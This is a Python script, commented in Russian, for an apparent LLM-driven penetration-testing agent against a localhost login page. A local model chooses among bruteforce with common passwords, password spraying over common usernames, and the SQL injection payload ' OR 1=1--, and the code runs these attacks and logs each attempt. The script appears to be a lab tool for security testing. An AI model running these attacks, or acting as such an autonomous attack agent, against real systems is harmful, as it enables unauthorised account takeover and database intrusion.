import requests
import ollama
import json
import time

TARGET = "http://localhost:8000/login"
ollama.host = "http://localhost:11434"


class PentestAgent:

    def __init__(self):
        self.model = "qwen3"
        self.history = []

    # ================= LLM =================

    def ask_llm(self, prompt):
        response = ollama.chat(
            model=self.model,
            messages=[{"role": "user", "content": prompt}]
        )
        return response["message"]["content"]

    def decide_next_action(self):

        prompt = f"""
Ты AI pentester.

Цель: протестировать endpoint /login

Уже выполнено:
{self.history}

Доступные действия:
- bruteforce
- password_spray
- sql_injection
- finish

Отвечай строго JSON:

{{
  "action": "...",
  "params": {{
    "username": "...",
    "password": "...",
    "payload": "..."
  }},
  "reason": "..."
}}

Правила:
- не повторяй одинаковые тесты
- пробуй разные подходы
- если найден успешный логин — продолжай проверку
- если всё проверено → finish
"""

        response = self.ask_llm(prompt)

        try:
            return json.loads(response)
        except:
            print("Ошибка парсинга LLM:", response)
            return {"action": "finish"}

    # ================= CORE =================

    def run(self):

        print("🚀 Запуск AI pentest агента\n")

        while True:

            decision = self.decide_next_action()

            action = decision.get("action")
            params = decision.get("params", {})

            print(f"\nДействие: {action}")
            print(f"Причина: {decision.get('reason')}")

            if action == "finish":
                print("\nТест завершен")
                break

            result = self.execute_tool(action, params)

            self.history.append({
                "action": action,
                "result": result[:300]
            })

            print("Результат:\n", result)

            time.sleep(1)

    # ================= TOOLS =================

    def execute_tool(self, action, params):

        if action == "bruteforce":
            return self.bruteforce(params)

        elif action == "password_spray":
            return self.password_spray(params)

        elif action == "sql_injection":
            return self.sql_injection(params)

        return "unknown action"

    # ================= HTTP =================

    def send_request(self, username, password):

        data = {
            "username": username,
            "password": password
        }

        r = requests.post(TARGET, data=data)

        return {
            "status": r.status_code,
            "text": r.text[:500],
            "raw": r.text
        }

    # ================= LOGIN DETECT =================

    def is_login_success(self, response):

        text = response["text"].lower()
        status = response["status"]

        success_indicators = ["dashboard", "logout", "welcome"]
        fail_indicators = ["invalid", "error", "incorrect", "failed"]

        if status in [401, 403]:
            return False

        if any(word in text for word in success_indicators):
            return True

        if any(word in text for word in fail_indicators):
            return False

        return status == 200

    # ================= LOGGING =================

    def log_result(self, attack_type, username, password, success):

        with open("pentest_log.txt", "a", encoding="utf-8") as f:
            f.write(
                f"{attack_type} | user={username} | pass={password} | success={success}\n"
            )

    # ================= ATTACKS =================

    def bruteforce(self, params):

        username = params.get("username", "admin")

        passwords = ["admin", "123456", "password", "admin123"]

        results = []

        for pwd in passwords:

            res = self.send_request(username, pwd)
            success = self.is_login_success(res)

            self.log_result("bruteforce", username, pwd, success)

            results.append(f"{username}:{pwd} -> {success}")

            if success:
                results.append("УСПЕШНЫЙ ВХОД!")
                break

        return "\n".join(results)

    def password_spray(self, params):

        password = params.get("password", "123456")

        users = ["admin", "user", "test", "guest"]

        results = []

        for user in users:

            res = self.send_request(user, password)
            success = self.is_login_success(res)

            self.log_result("password_spray", user, password, success)

            results.append(f"{user}:{password} -> {success}")

            if success:
                results.append("НАЙДЕН ПАРОЛЬ!")
                break

        return "\n".join(results)

    def sql_injection(self, params):

        payload = params.get("payload", "' OR 1=1--")

        res = self.send_request(payload, payload)
        success = self.is_login_success(res)

        self.log_result("sql_injection", payload, payload, success)

        return f"{payload} -> success={success} status={res['status']}"


# ================= RUN =================

if __name__ == "__main__":
    agent = PentestAgent()
    agent.run()
